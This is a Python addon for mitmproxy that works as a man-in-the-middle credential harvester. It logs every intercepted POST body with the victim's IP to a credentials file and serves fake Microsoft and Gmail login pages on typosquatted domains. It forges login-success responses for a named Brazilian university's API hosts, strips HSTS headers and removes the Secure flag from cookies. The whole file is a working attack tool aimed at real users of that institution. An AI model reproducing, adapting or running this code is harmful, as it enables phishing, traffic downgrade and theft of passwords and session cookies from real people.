"""mitmproxy addon: SSL strip + credential capture + API intercept."""
from mitmproxy import http
import re, os, json

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CREDS_LOG = os.path.join(BASE_DIR, "captures", "creds_found.txt")

_ns = {"__file__": os.path.join(BASE_DIR, "tools", "responder_targeted.py")}
exec(open(os.path.join(BASE_DIR, "tools", "responder_targeted.py")).read(), _ns)
MICROSOFT_PAGE = _ns.get("FAKE_LOGIN_PAGE", "")
GMAIL_PAGE = _ns.get("FAKE_LOGIN_GMAIL_PAGE", "")

FAKE_PAGE_DOMAINS = {
    "login.microsoftonllne.com": MICROSOFT_PAGE,
    "login.microsoftonIine.com": MICROSOFT_PAGE,
    "login.rnicrosoftonline.com": MICROSOFT_PAGE,
    "rnicrosoftonline.com": MICROSOFT_PAGE,
    "accounts.googie.com": GMAIL_PAGE,
    "accounts.g00gle.com": GMAIL_PAGE,
}


class MITMHandler:
    def request(self, flow):
        host = flow.request.pretty_host
        path = flow.request.path
        method = flow.request.method

        # Capture ALL POST data
        if method == "POST":
            body = flow.request.get_text() or ""
            if body.strip():
                msg = f"[CAPTURE] {flow.client_conn.peername[0]} POST {host}{path}: {body}"
                print(f"\n{msg}", flush=True)
                with open(CREDS_LOG, "a") as f:
                    f.write(f"{msg}\n")

        # Serve typosquat fake pages
        page = FAKE_PAGE_DOMAINS.get(host)
        if page:
            flow.response = http.Response.make(
                200, page.encode(),
                {"Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-cache"}
            )
            return

        # Intercept API calls from real page
        if host in ("apiv2.inteli.edu.br", "api.inteli.edu.br", "apiwss.inteli.edu.br"):
            self._handle_api(flow, host, path, method)

    def _handle_api(self, flow, host, path, method):
        if method == "OPTIONS":
            flow.response = http.Response.make(
                200, b"",
                {
                    "Access-Control-Allow-Origin": "https://adalove.inteli.edu.br",
                    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
                    "Access-Control-Allow-Headers": "*",
                    "Access-Control-Allow-Credentials": "true",
                    "Access-Control-Max-Age": "86400",
                }
            )
            return

        if method == "POST":
            flow.response = http.Response.make(
                200,
                json.dumps({
                    "success": True,
                    "message": "Login successful",
                    "token": "fake_token",
                }).encode(),
                {
                    "Content-Type": "application/json",
                    "Access-Control-Allow-Origin": "https://adalove.inteli.edu.br",
                    "Access-Control-Allow-Credentials": "true",
                }
            )
            return

        flow.response = http.Response.make(
            200, b'{"ok":true}',
            {"Content-Type": "application/json",
             "Access-Control-Allow-Origin": "https://adalove.inteli.edu.br"}
        )

    def response(self, flow):
        host = flow.request.pretty_host

        if host in FAKE_PAGE_DOMAINS:
            return
        if "inteli.edu.br" in host:
            return

        if "Strict-Transport-Security" in flow.response.headers:
            del flow.response.headers["Strict-Transport-Security"]

        if "Set-Cookie" in flow.response.headers:
            cookies = flow.response.headers.get_all("Set-Cookie")
            del flow.response.headers["Set-Cookie"]
            for c in cookies:
                c = re.sub(r';\s*[Ss][Ee][Cc][Uu][Rr][Ee]\s*', '', c)
                flow.response.headers.add("Set-Cookie", c)


addons = [MITMHandler()]
